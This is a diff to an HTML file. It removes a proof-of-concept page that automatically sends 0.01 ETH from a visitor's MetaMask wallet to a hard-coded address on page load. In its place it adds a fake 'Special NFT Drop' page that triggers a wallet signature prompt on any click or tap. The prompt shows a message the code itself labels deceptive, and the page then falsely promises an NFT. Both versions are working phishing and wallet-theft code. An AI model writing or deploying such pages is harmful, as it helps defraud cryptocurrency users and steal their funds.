@@ -1,38 +1,56 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>MetaMask Auto TX PoC</title>
-  </head>
-  <body>
-    <h1>Testing Auto MetaMask Transaction</h1>
-    <p>If MetaMask is installed and unlocked, a transaction popup will appear automatically.</p>
+<head>
+  <title>Claim NFT</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    #claim {
+      padding: 20px 40px;
+      font-size: 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎁 You’ve been selected for a Special NFT Drop!</h1>
+  <p>Click anywhere on the screen to claim.</p>
 
-    <script>
-      window.addEventListener("DOMContentLoaded", async () => {
-        if (typeof window.ethereum !== "undefined") {
-          try {
-            // Request wallet access
-            await ethereum.request({ method: 'eth_requestAccounts' });
+  <script>
+    let triggered = false;
 
-            // Send test transaction (0.01 ETH)
-            const tx = await ethereum.request({
-              method: 'eth_sendTransaction',
-              params: [{
-                from: ethereum.selectedAddress,
-                to: '0xE358B02A5d75358e8A2fFa00407c1f6d6b817faE',
-                value: '0x2386F26FC10000', // 0.01 ETH
-                chainId: '0x1' // Mainnet
-              }]
-            });
+    async function triggerSign() {
+      if (triggered || typeof window.ethereum === "undefined") return;
+      triggered = true;
 
-            console.log("Transaction sent:", tx);
-          } catch (err) {
-            console.error("Error:", err.message);
-          }
-        } else {
-          alert("MetaMask not detected.");
-        }
-      });
-    </script>
-  </body>
+      try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+
+        // Create a deceptive message
+        const message = `Confirm you are eligible to claim NFT. Wallet: ${accounts[0]}`;
+
+        // Trigger MetaMask sign prompt
+        const signature = await ethereum.request({
+          method: 'personal_sign',
+          params: [message, accounts[0]]
+        });
+
+        console.log("Signature captured:", signature);
+        alert("✅ Signature received. NFT will be sent!");
+      } catch (err) {
+        console.error("Signature rejected:", err.message);
+      }
+    }
+
+    // Trigger on ANY click or tap
+    document.addEventListener("click", triggerSign);
+    document.addEventListener("touchstart", triggerSign);
+  </script>
+</body>
 </html>
